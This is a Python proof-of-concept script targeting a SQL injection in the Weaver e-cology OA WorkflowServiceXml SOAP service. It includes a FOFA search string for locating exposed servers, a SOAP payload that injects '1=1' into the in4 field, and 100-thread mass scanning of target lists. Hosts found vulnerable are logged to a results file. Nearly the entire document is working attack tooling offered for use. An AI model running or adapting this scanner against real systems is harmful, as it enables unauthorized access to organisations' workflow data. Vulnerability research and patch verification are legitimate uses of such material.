泛微e-cology WorkflowServiceXml SQL注入

#泛微e-cology WorkflowServiceXml SQL注入
#FOFA:app="泛微-OA（e-cology）"
import requests,sys,argparse,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
     test="""                       _                   
                      | |                  
   ___ ______ ___ ___ | | ___   __ _ _   _ 
  / _ \______/ __/ _ \| |/ _ \ / _` | | | |
 |  __/     | (_| (_) | | (_) | (_| | |_| |
  \___|      \___\___/|_|\___/ \__, |\__, |
                                __/ | __/ |
                               |___/ |___/ 

 """
     print(test)

def main():
    banner()
    parsers=argparse.ArgumentParser(description='泛微e-cology WorkflowServiceXml SQL注入')
    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
    args=parsers.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        #mp.map(poc, url_list) 的作用是并行地对 url_list 中的每个 URL 执行 poc 函数（或方法）
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    payload='/services/WorkflowServiceXml'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'Content-Type': 'text/xml',
        'Accept-Encoding': 'gzip'
    }

    data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
                <soapenv:Header/>
                <soapenv:Body>
                    <web:getHendledWorkflowRequestList>
                        <web:in0>1</web:in0>
                        <web:in1>1</web:in1>
                        <web:in2>1</web:in2>
                        <web:in3>1</web:in3>
                        <web:in4>
                            <web:string>1=1</web:string>
                        </web:in4>
                    </web:getHendledWorkflowRequestList>
                </soapenv:Body>
              </soapenv:Envelope>'''
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
   
    try:
        res1=requests.post(url=target+payload,headers=headers,proxies=proxies,verify=False,data=data)
        if res1.status_code==200 and "WorkflowRequestInfo" in res1.text:
                    print(f"[+]目标存在 {target}")
                    with open('result.txt','a') as f:
                        f.write(target+'\n')
        else:
             print(f'[-]目标不存在漏洞 {target}')
    except:
        pass


if __name__ == '__main__':
    main()
